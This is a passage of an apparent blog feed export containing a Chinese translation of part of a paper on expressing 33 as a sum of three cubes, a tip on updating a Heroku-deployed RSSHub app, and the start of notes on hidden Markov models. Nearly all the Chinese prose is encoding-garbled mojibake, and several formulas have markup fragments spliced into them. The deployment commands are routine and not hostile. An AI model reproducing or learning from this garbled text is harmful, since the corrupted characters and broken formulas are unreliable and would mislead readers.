å¯¹äº$d$çš„ä¸€äº›å°å€¼ï¼Œæ‰¾åˆ°ï¼ˆ6ï¼‰ä¸Šçš„æ‰€æœ‰ç§¯åˆ†ç‚¹å¹¶æ£€æŸ¥æ˜¯å¦äº§ç”Ÿä»»ä½•æ»¡è¶³ï¼ˆ1ï¼‰çš„è§£æ˜¯åˆ‡å®å¯è¡Œçš„ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨Magma[<a href="#BCFS18">[BCFS18]</a>ï¼ŒÂ§128.2.8]ä¸­çš„ç§¯åˆ†ç‚¹å‡½æ•°ï¼ˆfunctionalityï¼‰ï¼Œæˆ‘ä»¬éªŒè¯äº†å¦‚ï¼ˆ2ï¼‰ä¸­çš„ $k$ å’Œ $d \le 40$ æƒ…å†µä¸‹æ²¡æœ‰è§£ï¼Œ é™¤äº†$(k, d)\in{(579,29),(579,34),(975,22)}$ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è‡ªç„¶æ³¨æ„åˆ°ä¸€äº›åŒä½™å’Œå¯åˆ†æ€§çº¦æŸï¼š</p><p><strong>å¼•ç†</strong> è®¾ $z$ ä¸ºï¼ˆ5ï¼‰çš„è§£ï¼Œè®¾ $p$ ä¸ºç´ æ•°ï¼Œ è®¾$s=ord_p d$ï¼Œ$t=ord_p(z^3-k)$ã€‚åˆ™</p><p>(i) $z \equiv \frac{4}{3} k\left(2-d^{2}\right)+9(k+d)(\mod 18)$ï¼›(ii) å¦‚æœ $p \equiv 2 (\mod 3)$ åˆ™ $t \le 3s$ï¼›(iii) å¦‚æœ $t \le 3s$ åˆ™ $s \equiv t (\mod 2)$ï¼›(iv) å¦‚æœ $ord_p k \in {1,2}$ åˆ™ $s \in {0,ord_p k}$ã€‚</p><p><em>è¯æ˜</em> ä»¤ $\Delta=3d\left(4\epsilon(\frac{d}{3})(z^3-k)-d^3\right)$ï¼Œ ä»¤$\delta=(\frac{d}{3})$ï¼Œæˆ‘ä»¬æœ‰ $|z| \equiv d \equiv \delta(\mod 3)$ï¼Œè§‚å¯Ÿåˆ° $(\delta+3 n)^{3} \equiv \delta+9 n(\mod 27)$ï¼Œæ¨¡27ï¼Œæˆ‘ä»¬æœ‰</p><p>$$\begin{aligned}\begin{aligned}\frac{\Delta}{3 d} &amp;=4 \epsilon \delta\left(z^{3}-k\right)-d^{3}=4|z|^{3}-d^{3}-4 \epsilon \delta k \&amp; \equiv 4[\delta+3(|z|-\delta)]-[\delta+3(d-\delta)]-4 \epsilon \delta k=3(4|z|-d)-\delta[18+4(\epsilon k-3)] \&amp; \equiv 3(4|z|-d)-d[18+4(\epsilon k-3)]=12|z|-9 d-4 \epsilon d k \&amp; \equiv 3|z|-4 \epsilon d k\end{aligned}\end{aligned}$$</p><p>è¿™æ¶ˆå¤±äº†æ¨¡9ï¼Œæ‰€ä»¥ä¸ºäº†ä½¿ $\Delta$ æˆä¸ºå¹³æ–¹æ•°ï¼Œå®ƒä¹Ÿå¿…é¡»æ¶ˆé™¤mod 27ã€‚ äºæ˜¯</p><p>$$z=\epsilon \delta|z| \equiv \frac{4 \delta d k}{3} \equiv \frac{4(2-d^{2}) k}{3} \quad(\mod 9)$$</p><p>å‡å°‘ï¼ˆ1ï¼‰æ¨¡2æˆ‘ä»¬å¾—åˆ° $z \equiv k+d(\mod 2)$ï¼Œè¿™å¾—åˆ°ï¼ˆiï¼‰ã€‚</p><p>æ¥ä¸‹æ¥è®¾ $u=p^{-s} d$ å’Œ $v=p^{-t} \epsilon \delta(z^{3}-k)$ï¼Œè¿™æ ·å°±æœ‰</p><p>$$\Delta=3\left(4 p^{s+t} u v-p^{4 s} u^{4}\right)$$</p><p>å¦‚æœ $3s&lt;t$ åˆ™ $p^{-4 s} \Delta \equiv-3 u^{4}(\mod 4 p)$ï¼Œ ä½†æ˜¯å½“$p \equiv 2(\mod 3)$ æ—¶è¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œå› ä¸º $-3$ ä¸æ˜¯ $4p$ çš„å¹³æ–¹æ¨¡ã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¿…é¡» $t&lt;3s$ã€‚</p><p>æ¥ä¸‹æ¥å‡è®¾ $t&lt;3s$ã€‚ æˆ‘ä»¬è€ƒè™‘ä»¥ä¸‹æƒ…å†µï¼Œæ¶µç›–æ‰€æœ‰å¯èƒ½æ€§ï¼š</p><ul><li>è‹¥ $p = 3$ åˆ™ $s = t = 0$ï¼Œé‚£ä¹ˆ $s \equiv t(\bmod 2)$ã€‚</li><li>è‹¥ $p \ne 3$ ä¸” $3s &gt; t+2 \operatorname{ord}<em>{p} 2$ï¼Œ åˆ™ $\operatorname{ord}</em>{p} \Delta=s+t+2 \operatorname{ord}_{p} 2$ï¼Œé‚£ä¹ˆ $s \equiv t(\mod 2)$ã€‚</li><li>è‹¥ $3s\in{t, t+2}$ åˆ™ $s \equiv t(\bmod 2)$ã€‚</li><li>å¦‚æœ $p=2$ ä¸” $3s = t + 1$ åˆ™ $2^{-4 s} \Delta=3(2 u v-u^{4}) \equiv 3(\bmod 4)$ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚</li></ul><p>å› æ­¤ï¼Œåœ¨ä»»ä½•æƒ…å†µæˆ‘ä»¬å¾—å‡ºç»“è®º $s \equiv t(\mod 2)$ã€‚</p><p>æœ€åï¼Œå‡è®¾ $p|k$ å’Œ $p \not | 3k$ã€‚å¦‚æœ $s=0$åˆ™æ— éœ€è¯æ˜çš„ï¼Œæ‰€ä»¥å‡è®¾ä¸ç„¶ã€‚ ç”±äº $d | z^{3}-k$ï¼Œæˆ‘ä»¬å¿…é¡»æœ‰$d | k$ï¼Œå› ä¸º</p><p>$$0 &lt; s \le t=\operatorname{ord}<em>{p}(z^{3}-k)=\operatorname{ord}</em>{p} k&lt;3 s$$</p><p>é€šè¿‡éƒ¨åˆ†ï¼ˆiiiï¼‰å¾—å‡º $s \equiv \operatorname{ord}<em>{p} k(\mod 2)$ï¼Œ å› æ­¤$s=\operatorname{ord}</em>{p} k$ã€‚</p><p>å› æ­¤ï¼Œä¸€æ—¦ $z(\mod d)$ çš„æ®‹å·®ç±»ï¼ˆresidue classï¼‰å›ºå®šï¼Œ åˆ™å…¶æ®‹å·®æ¨¡$lcm(d,18)$ æ˜¯ç¡®å®šçš„ã€‚è¿˜è¦æ³¨æ„ï¼Œæ¡ä»¶ï¼ˆiiï¼‰å’Œï¼ˆiiiï¼‰å¯¹äºæµ‹è¯• $p=2$æ˜¯æœ‰æ•ˆçš„ã€‚</p><p>ç„¶è€Œï¼Œå³ä½¿æœ‰è¿™äº›ä¼˜åŒ–ï¼Œä¹Ÿæœ‰ $\ll B\log B$ å¯¹ $d, z$æ»¡è¶³ï¼ˆ5ï¼‰çš„ç¬¬ä¸€è¡Œå’Œå¼•ç†çš„ç»“è®ºï¼ˆiï¼‰å’Œï¼ˆivï¼‰ã€‚ å› æ­¤ï¼Œä¸ºäº†å®ç°æ¯”$O(B\log B)$ æ›´å¥½çš„è¿è¡Œæ—¶é—´ï¼Œéœ€è¦ä»ä¸€å¼€å§‹å°±æ¶ˆé™¤ä¸€äº› $z$ å€¼ã€‚æˆ‘ä»¬é€šè¿‡æ ‡å‡†çš„æ—¶é—´ç©ºé—´äº¤æ¢æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚ç¡®åˆ‡åœ°è¯´ï¼Œè®¾ç½®$P=3(\log \log B)(\log \log \log B)$ï¼Œ å¹¶ä¸”è®©$M=\prod_{5 \le p \le P} p$ æ˜¯åŒºé—´ $[5, P]$ ä¹‹é—´çš„ç´ æ•°çš„ä¹˜ç§¯ã€‚æ ¹æ®ç´ æ•°å®šç†ï¼Œæˆ‘ä»¬å¾—åˆ° $\log M=(1+o(1)) P$ã€‚å¦‚æœ $\Delta$ æ˜¯å¹³æ–¹æ•°ï¼Œé‚£ä¹ˆå¯¹äºä»»æ„ç´ æ•° $p|M$ æˆ‘ä»¬æœ‰</p><p>$$\left(\frac{\Delta}{p}\right)=\left(\frac{3 d}{p}\right)\left(\frac{|z|^{3}-c}{p}\right) \in{0,1} \quad \text{(7)}$$</p><p>å…¶ä¸­ $c \equiv \epsilon\left(\frac{d}{3}\right) k+\frac{d^{3}}{4}$ã€‚ å½“$\operatorname{lcm}(d, 18) \le \alpha B / M$ æ—¶ï¼Œ æˆ‘ä»¬é¦–å…ˆä¸ºæ¯ä¸ªæ®‹å·®ç±»$|z|(\bmod M)$ è®¡ç®—è¯¥å‡½æ•°ï¼Œ å¹¶ä¸”ä»…é€‰æ‹©å¯¹äºæ¯ä¸ª $p|M$æ»¡è¶³ï¼ˆ7ï¼‰çš„é‚£äº›æ®‹åŸºã€‚ ç”±Hasseçº¦æŸï¼Œå…è®¸çš„æ®‹å·®çš„æ•°é‡æœ€å¤šä¸º</p><p>$$\frac{M}{2^{\omega(M /(M, d))}} \prod_{p | \frac{M}{(M, d)}}\left(1+O\left(\frac{1}{\sqrt{p}}\right)\right)=\frac{M}{2^{\omega(M /(M, d))}} e^{O(\sqrt{P} / \log P)}$$</p><p>å› æ­¤ï¼Œè¦è€ƒè™‘çš„ $z$ å€¼çš„æ€»æ•°æœ€å¤šä¸º</p><p>$$\begin{aligned}\begin{array}{l}{\sum_{\operatorname{lcm}(d, 18) \le \frac{\alpha B}{M}} r_{d}(k)\left[M+\frac{e^{O(\sqrt{P} / \log P)}}{2^{\omega(M /(M, d))}} \frac{\alpha B}{d}\right] +\sum_{d \le \alpha B, {lcm}(d, 18) \le \frac{\alpha B}{M}} \frac{r_{d}(k) \alpha B}{d}} \{\ll_{k} B \log M+\frac{e^{O(\sqrt{P} / \log P)}}{2^{\omega(M)}} \sum_{g | M} \frac{2^{\omega(g)} r_{g}(k)}{g} \sum_{d^{\prime} \le \frac{\alpha B}{9 g M}} \frac{r_{d^{\prime}}(k) \alpha B}{d^{\prime}}} \{\ll_{k} B \log M+B \log B \frac{e^{O(\sqrt{P} / \log P)}}{2^{\omega(M)}} \prod_{p | M}\left(1+\frac{2 r_{p}(k)}{p}\right)} \{\ll B P+\frac{B \log B}{2^{(1+o(1)) P / \log P}} \ll B(\log \log B)(\log \log \log B)}\end{array}\end{aligned}$$</p><p>å¯¹äºæ²¡æœ‰ä»¥è¿™ç§æ–¹å¼æ¶ˆé™¤çš„ $z$ï¼Œæˆ‘ä»¬éµå¾ªç±»ä¼¼çš„ç­–ç•¥ï¼Œ å…¶ä¸­ä¸€äº›å…¶ä»–è¾…åŠ©æ¨¡$M^{\prime}$ ç”±è¾ƒå¤§çš„ç´ æ•°ç»„æˆï¼Œä»¥åŠ é€Ÿå¹³æ–¹æµ‹è¯•ã€‚ æˆ‘ä»¬é¢„å…ˆè®¡ç®—æ¨¡ä¸º$M^{\prime}$ çš„ç«‹æ–¹æ•°è¡¨å’ŒLegendreç¬¦å·æ¨¡ $p|M^{\prime}$ï¼Œå› æ­¤å°†æµ‹è¯•ï¼ˆ7ï¼‰ç®€åŒ–ä¸ºäº†è¡¨æŸ¥æ‰¾ã€‚åªæœ‰å½“æ‰€æœ‰è¿™äº›æµ‹è¯•éƒ½é€šè¿‡æ—¶ï¼Œæˆ‘ä»¬æ‰èƒ½åœ¨å¤šç²¾åº¦ç®—æœ¯ä¸­è®¡ç®— $\Delta$å¹¶åº”ç”¨ä¸€èˆ¬çš„å¹³æ–¹æ£€éªŒï¼Œè¿™ç§æƒ…å†µå¯¹äºä¸€å°éƒ¨åˆ†å€™é€‰å€¼æ¥è¯´éƒ½æ˜¯å¦‚æ­¤ã€‚äº‹å®ä¸Šï¼Œæˆ‘ä»¬æœŸæœ›Legendreæµ‹è¯•çš„æ•°é‡å¹³å‡æœ‰é™ï¼Œæ‰€ä»¥æ€»çš„æ¥è¯´ï¼Œæ‰¾åˆ°æ‰€æœ‰è§£å†³æ–¹æ¡ˆçš„ $|z| \le B$ åº”è¯¥è¦æ±‚ä¸è¶…è¿‡$O_k(B(\log \log B)(\log \log \log B))$ æ¬¡è¡¨æŸ¥æ‰¾å’Œå¯¹ $[0, B]$ä¸­æ•´æ•°çš„ç®—æœ¯è¿ç®—ã€‚</p><p>å› æ­¤ï¼Œå½“ $B$ç¬¦åˆæœºå™¨å­—å¤§å°æ—¶ï¼Œæˆ‘ä»¬é¢„è®¡è¿è¡Œæ—¶é—´å‡ ä¹æ˜¯çº¿æ€§çš„ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬åœ¨å®è·µä¸­è§‚å¯Ÿåˆ°çš„$B&lt;2^{64}$ã€‚</p><h2><span id="3-shi-xian">3. å®ç°</span></h2><p>æˆ‘ä»¬åœ¨Cä¸­å®ç°äº†ä¸Šè¿°ç®—æ³•ï¼Œå…¶ä¸­æœ‰ä¸€äº›å†…è”æ±‡ç¼–ç¨‹åºæ¥æºäºç”±Ben Buhrow<a href="#Buh19">[Buh19]</a> ç¼–å†™çš„Montgomeryç®—æ³•<a href="#Mon85">[Mon85]</a>ï¼Œ ä»¥åŠKim Walischçš„ç”¨äºæšä¸¾ç´ æ•°çš„<strong>primesieve</strong> åº“ <a href="#Wal19">[Wal19]</a>ã€‚</p><p>è¯¥ç®—æ³•è‡ªç„¶åœ°åœ¨å…·æœ‰è¶…è¿‡ $\sqrt{\alpha B}$ çš„ç´ å› å­å’Œ å…·æœ‰$\sqrt{\alpha B}$ -å¹³æ»‘çš„ç´ æ•°çš„ $d$ çš„å€¼ä¹‹é—´åˆ†é…ã€‚ å‰ä¸€ç»„ $d$æ¶ˆè€—è¶…è¿‡è¿è¡Œæ—¶é—´çš„ä¸‰åˆ†ä¹‹äºŒï¼Œä½†æ›´å®¹æ˜“å¹¶è¡ŒåŒ–ã€‚æˆ‘ä»¬åœ¨å¸ƒé‡Œæ–¯æ‰˜å¤§å­¦é«˜çº§è®¡ç®—ç ”ç©¶ä¸­å¿ƒçš„å¤§è§„æ¨¡å¹¶è¡Œé›†ç¾¤Bluecrystal Phase3ä¸Šè¿è¡Œäº†è¿™ä¸€éƒ¨åˆ†ã€‚ å¯¹äºå¹³æ»‘çš„$d$ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªå•ç‹¬çš„32æ ¸å’Œ64æ ¸èŠ‚ç‚¹çš„å°é›†ç¾¤ã€‚</p><p>æˆ‘ä»¬æœç´¢äº†æ»¡è¶³ $k \in {33,42}$ å’Œ $\min{|x|, |y|, |z|} \le 10^16$çš„ï¼ˆ1ï¼‰çš„è§£ï¼Œæ‰¾åˆ°äº†ä»¥ä¸‹ç»“æœï¼š</p><p>$$33 = 8 866 128 975 287 528^3 +ï¼ˆ-8 778 405 442 862 239)^3 +ï¼ˆ-2 736 111 468 807 040)^3$$</p><p>æ€»è®¡ç®—åœ¨ä¸‰ä¸ªæ˜ŸæœŸçš„å®é™…æ—¶é—´ä¸­å¤§çº¦ä½¿ç”¨äº†15ä¸ªæ ¸å¹´ã€‚</p><h2><span id="can-kao-wen-xian">å‚è€ƒæ–‡çŒ®</span></h2><p>ï¼ˆç•¥ï¼‰</p><p>School of Mathematics, University of Bristol, University Walk, Bristol,BS8 1TW, United Kingdom</p><p>E-mail address: <a href="mailto:andrew.booker@bristol.ac.uk">andrew.booker@bristol.ac.uk</a></p><hr><h2><span id="bo-ke-can-kao">åšå®¢å‚è€ƒï¼š</span></h2><ul><li><a href="http://www.duodaa.com/blog/index.php/archives/1857/">äººç±»ç¬¬ä¸€æ¬¡å°†33å†™æˆäº†3ä¸ªæ•´æ•°çš„ç«‹æ–¹å’Œ</a></li></ul><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/61#issuecomment-482011133"><strong>qiwihui</strong></a> on: <strong>4/11/2019</strong></p></blockquote><p><img src="https://github.trello.services/images/mini-trello-icon.png" alt> <a href="https://trello.com/c/QWCHZJvO/78-cracking-problem-with-33">cracking problem with 33</a></p>]]></content>
    
    <summary type="html">
    
      è§£å†³33é—®é¢˜â”€â”€å°†33å†™æˆ3ä¸ªæ•´æ•°çš„ç«‹æ–¹å’Œ
    
    </summary>
    
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="æ•°å­¦" scheme="https://qiwihui.com/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>åœ¨ â€œDeploy to Herokuâ€ ä¹‹åæ‰‹åŠ¨æ›´æ–°Herokuåº”ç”¨</title>
    <link href="https://qiwihui.com/qiwihui-blog-69/"/>
    <id>https://qiwihui.com/qiwihui-blog-69/</id>
    <published>2019-05-05T05:19:42.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™ä¸ªtipsä»¥RSSHubä¸ºä¾‹å­ã€‚æˆ‘åœ¨Herokuä¸Šéƒ¨ç½²äº†RSSHubç”¨ä»¥æ—¥å¸¸RSSéœ€æ±‚ï¼Œè¿™ä¸ªå·²ç»éƒ¨ç½²å¾ˆä¹…äº†ï¼ˆ2018å¹´11æœˆï¼‰ï¼Œå‡†å¤‡æ›´æ–°ä¸€ç‰ˆï¼Œè®°å½•å¦‚ä¸‹ã€‚</p><span id="more"></span><ol><li>ç™»å½•Herokuï¼ŒæŒ‰ç…§æç¤ºè¿›è¡Œè®¤è¯å¹¶ç™»å½•ã€‚</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">heroku login</span></span><br></pre></td></tr></table></figure><ol start="2"><li>è·å–æœ€æ–°ä»£ç ï¼Œè¿™é‡Œæˆ‘åœ¨RSSHubé¡¹ç›®ç›®å½•ä¸­è¿›è¡Œäº†æ‹‰å–ï¼ˆpullï¼‰ï¼š</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> RSSHub</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git pull origin master</span></span><br></pre></td></tr></table></figure><ol start="3"><li>æ·»åŠ Herokuä¸­é¡¹ç›®urlï¼Œå¯åœ¨ <code>Settings</code> ä¸­ <code>Heroku Git URL</code> æ‰¾åˆ°ï¼š</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">heroku git:remote -a rss-qiwihui</span>                       </span><br><span class="line">set git remote heroku to https://git.heroku.com/rss-qiwihui.git</span><br></pre></td></tr></table></figure><ol start="4"><li>å‘Herokuæ¨é€ï¼Œè¿™æ—¶Herokuä¼šè‡ªåŠ¨è¿›è¡Œéƒ¨ç½²ï¼Œç»“æœå¦‚ä¸‹ï¼š</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push heroku master</span></span><br><span class="line">Enumerating objects: 12288, done.</span><br><span class="line">Counting objects: 100% (12288/12288), done.</span><br><span class="line">Delta compression using up to 4 threads</span><br><span class="line">Compressing objects: 100% (3324/3324), done.</span><br><span class="line">Writing objects: 100% (12288/12288), 6.32 MiB | 40.44 MiB/s, done.</span><br><span class="line">Total 12288 (delta 8027), reused 12287 (delta 8026)</span><br><span class="line">remote: Compressing source files... done.</span><br><span class="line">remote: Building source:</span><br><span class="line">remote: </span><br><span class="line">remote: -----&gt; Node.js app detected</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Creating runtime environment</span><br><span class="line">remote:        </span><br><span class="line">remote:        NPM_CONFIG_LOGLEVEL=error</span><br><span class="line">remote:        NODE_ENV=production</span><br><span class="line">remote:        NODE_MODULES_CACHE=true</span><br><span class="line">remote:        NODE_VERBOSE=false</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Installing binaries</span><br><span class="line">remote:        engines.node (package.json):  &gt;=8.0.0</span><br><span class="line">remote:        engines.npm (package.json):   unspecified (use default)</span><br><span class="line">remote:        engines.yarn (package.json):  unspecified (use default)</span><br><span class="line">remote:        </span><br><span class="line">remote:        Resolving node version &gt;=8.0.0...</span><br><span class="line">remote:        Downloading and installing node 12.1.0...</span><br><span class="line">remote:        Using default npm version: 6.9.0</span><br><span class="line">remote:        Resolving yarn version 1.x...</span><br><span class="line">remote:        Downloading and installing yarn (1.16.0)...</span><br><span class="line">remote:        Installed yarn 1.16.0</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Restoring cache</span><br><span class="line">remote:        Cached directories were not restored due to a change in version of node, npm, yarn or stack</span><br><span class="line">remote:        Module installation may take longer for this build</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Installing dependencies</span><br><span class="line">remote:        Installing node modules (yarn.lock)</span><br><span class="line">remote:        yarn install v1.16.0</span><br><span class="line">remote:        [1/4] Resolving packages...</span><br><span class="line">remote:        [2/4] Fetching packages...</span><br><span class="line">remote:        info fsevents@1.2.8: The platform &quot;linux&quot; is incompatible with this module.</span><br><span class="line">remote:        info &quot;fsevents@1.2.8&quot; is an optional dependency and failed compatibility check. Excluding it from installation.</span><br><span class="line">remote:        [3/4] Linking dependencies...</span><br><span class="line">remote:        [4/4] Building fresh packages...</span><br><span class="line">remote:        Done in 55.40s.</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Build</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Caching build</span><br><span class="line">remote:        - node_modules</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Pruning devDependencies</span><br><span class="line">remote:        yarn install v1.16.0</span><br><span class="line">remote:        [1/4] Resolving packages...</span><br><span class="line">remote:        [2/4] Fetching packages...</span><br><span class="line">remote:        info fsevents@1.2.8: The platform &quot;linux&quot; is incompatible with this module.</span><br><span class="line">remote:        info &quot;fsevents@1.2.8&quot; is an optional dependency and failed compatibility check. Excluding it from installation.</span><br><span class="line">remote:        [3/4] Linking dependencies...</span><br><span class="line">remote:        [4/4] Building fresh packages...</span><br><span class="line">remote:        warning Ignored scripts due to flag.</span><br><span class="line">remote:        Done in 8.07s.</span><br><span class="line">remote:        </span><br><span class="line">remote: -----&gt; Build succeeded!</span><br><span class="line">remote: -----&gt; Discovering process types</span><br><span class="line">remote:        Procfile declares types -&gt; web</span><br><span class="line">remote: </span><br><span class="line">remote: -----&gt; Compressing...</span><br><span class="line">remote:        Done: 143.8M</span><br><span class="line">remote: -----&gt; Launching...</span><br><span class="line">remote:        Released v5</span><br><span class="line">remote:        https://rss-qiwihui.herokuapp.com/ deployed to Heroku</span><br><span class="line">remote: </span><br><span class="line">remote: Verifying deploy... done.</span><br><span class="line">To https://git.heroku.com/rss-qiwihui.git</span><br><span class="line"> * [new branch]      master -&gt; master</span><br></pre></td></tr></table></figure><ol start="5"><li>è®¾ç½®ç¯å¢ƒå˜é‡ <code>HEROKU_SLUG_COMMIT</code>:</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">heroku config:<span class="built_in">set</span> HEROKU_SLUG_COMMIT=$(git rev-parse --short HEAD)</span></span><br><span class="line">Setting HEROKU_SLUG_COMMIT and restarting â¬¢ rss-qiwihui... done, v8</span><br><span class="line"> â–¸    Warning: The &quot;HEROKU_&quot; namespace is protected and shouldn&#x27;t be used.</span><br><span class="line">HEROKU_SLUG_COMMIT: a8066bd</span><br></pre></td></tr></table></figure><ol start="6"><li>éªŒè¯ï¼š</li></ol><p>å‰å¾€ç›¸åº”çš„é¡µé¢éªŒè¯ï¼Œå¯ä»¥çœ‹åˆ°åœ¨Debugä¸­çš„ githashå€¼å·²ç»æ˜¯å½“å‰æœ€æ–°çš„hashå€¼äº†ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/57205060-5b873d00-6fee-11e9-893f-14b2978d3b92.png" alt="githash"></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      åœ¨ â€œDeploy to Herokuâ€ ä¹‹åæ‰‹åŠ¨æ›´æ–°Herokuåº”ç”¨
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
  </entry>
  
  <entry>
    <title>HMMç†è§£æ€è·¯</title>
    <link href="https://qiwihui.com/qiwihui-blog-74/"/>
    <id>https://qiwihui.com/qiwihui-blog-74/</id>
    <published>2019-03-06T09:39:05.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="hmm">HMM</span></h1><p>æœ¬æ–‡æ•´ç†ç®€å•æ•´ç†ä¸€ä¸‹HMMçš„ç†è§£æ€è·¯ã€‚</p><span id="more"></span><h2><span id="mo-xing">æ¨¡å‹</span></h2><h3><span id="ma-er-ke-fu-xing-yu-ma-er-ke-fu-lian">é©¬å°”ç§‘å¤«æ€§ä¸é©¬å°”ç§‘å¤«é“¾</span></h3><p>æ€§è´¨ï¼š- æœ‰é™å†å²å‡è®¾- æ—¶é—´ä¸å˜æ€§</p><h3><span id="yin-ma-er-ke-fu-mo-xing">éšé©¬å°”ç§‘å¤«æ¨¡å‹</span></h3><ol><li><p>æ¨¡å‹å®šä¹‰ï¼š1ã€åˆå§‹çŠ¶æ€æ¦‚ç‡å‘é‡ $\pi=(\pi_i)$ï¼Œå…¶ä¸­ $\pi_{i}=P(i_{1}=q_{i}), \quad i=1,2, \cdots, N$2ã€çŠ¶æ€è½¬ç§»æ¦‚ç‡çŸ©é˜µ $A=\left[a_{i j}\right]<em>{N \times N}$ï¼Œå…¶ä¸­ $a</em>{i j}=P\left(i_{t+1}=q_{j} | i_{t}=q_{i}\right), \quad i=1,2, \cdots, N ; j=1,2, \cdots, N$3ã€è§‚æµ‹æ¦‚ç‡çŸ©é˜µ $B=\left[b_{j}(k)\right]<em>{N \times M}$ï¼Œå…¶ä¸­ $b</em>{j}(k)=P\left(o_{t}=v_{k} | i_{t}=q_{j}\right), \quad k=1,2, \cdots, M ; j=1,2, \cdots, N$4ã€è§‚æµ‹åºåˆ— $O=(o_{1}, o_{2}, \cdots, o_{T})$ï¼ŒçŠ¶æ€åºåˆ— $I=(i_{1}, i_{2}, \cdots, i_{T})$5ã€çŠ¶æ€é›†åˆ $Q=\left{q_{1}, q_{2}, \cdots, q_{N}\right}$ï¼Œè§‚æµ‹é›†åˆ $V=\left{v_{1}, v_{2}, \cdots, v_{M}\right}$</p></li><li><p>æ¨¡å‹ä¸‰å…ƒç»„ $\lambda=(A, B, \pi)$</p><p>çŠ¶æ€è½¬ç§»æ¦‚ç‡çŸ©é˜µAä¸åˆå§‹çŠ¶æ€æ¦‚ç‡å‘é‡ç¡®å®šäº†éšè—çš„é©¬å°”ç§‘å¤«é“¾ï¼Œç”Ÿæˆä¸å¯è§‚æµ‹çš„åºåˆ—ã€‚è§‚æµ‹æ¦‚ç‡çŸ©é˜µBç¡®å®šäº†å¦‚ä½•ä»çŠ¶æ€ç”Ÿæˆè§„åˆ™ï¼Œä¸çŠ¶æ€åºåˆ—ç»¼åˆç¡®å®šäº†å¦‚ä½•äº§ç”Ÿè§‚æµ‹åºåˆ—ã€‚</p></li><li><p>æ¨¡å‹åŸºæœ¬å‡è®¾ï¼š</p><ul><li>é½æ¬¡é©¬å°”ç§‘å¤«æ€§å‡è®¾ï¼šè®¾éšé©¬å°”ç§‘å¤«é“¾åœ¨ä»»æ„æ—¶åˆ»tçš„çŠ¶æ€åªä¾èµ–äºå…¶å‰ä¸€æ—¶åˆ»çš„çŠ¶æ€ï¼Œä¸å…¶ä»–æ—¶åˆ»çš„çŠ¶æ€åŠè§‚æµ‹æ— å…³ï¼Œä¹Ÿä¸æ—¶åˆ»tæ— å…³ã€‚</li><li>è§‚æµ‹ç‹¬ç«‹æ€§å‡è®¾ï¼šå‡è®¾ä»»æ„æ—¶åˆ»çš„è§‚æµ‹åªä¾èµ–äºè¯¥æ—¶åˆ»çš„é©¬å°”ç§‘å¤«é“¾çš„çŠ¶æ€ï¼Œä¸å…¶ä»–è§‚æµ‹å’ŒçŠ¶æ€æ— å…³ã€‚</li></ul></li><li><p>ä¾‹å­ï¼š</p><ul><li><a href="https://en.wikipedia.org/wiki/Viterbi_algorithm#Example">æ„Ÿå†’é¢„æµ‹</a>ï¼Œ<a href="https://applenob.github.io/hmm.html#%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E6%84%9F%E5%86%92%E7%9A%84%E5%AE%9E%E4%BE%8B">ä¸­æ–‡</a></li><li><a href="https://www.zhihu.com/question/20962240/answer/33438846">æ·éª°å­</a></li><li><a href="https://www.zhihu.com/question/20962240/answer/64187492">å¤©æ°”æ¨¡å‹</a></li><li><a href="https://www.zhihu.com/question/20962240/answer/33561657">å·æ¢éª°å­å¤§æ³•</a></li></ul></li></ol><h2><span id="san-ge-wen-ti">ä¸‰ä¸ªé—®é¢˜</span></h2><h3><span id="gai-lu-ji-suan-wen-ti-ping-gu">æ¦‚ç‡è®¡ç®—é—®é¢˜ï¼ˆè¯„ä¼°ï¼‰</span></h3><p>ç»™å®šæ¨¡å‹ $\lambda=(A, B, \pi)$ å’Œè§‚æµ‹åºåˆ— $O=o_{1}, o_{2}, \ldots, o_{T}$ï¼Œè®¡ç®—åœ¨æ¨¡å‹ $\pi$ ä¸‹è§‚æµ‹åºåˆ— $O$ å‡ºç°çš„æ¦‚ç‡ $P(O | \lambda)$ã€‚- ç©·ä¸¾æœç´¢ï¼Œ<code>O(TN^T)</code>- å‰å‘ç®—æ³•ï¼Œ<code>O(N^2T)</code>- åå‘ç®—æ³•</p><h3><span 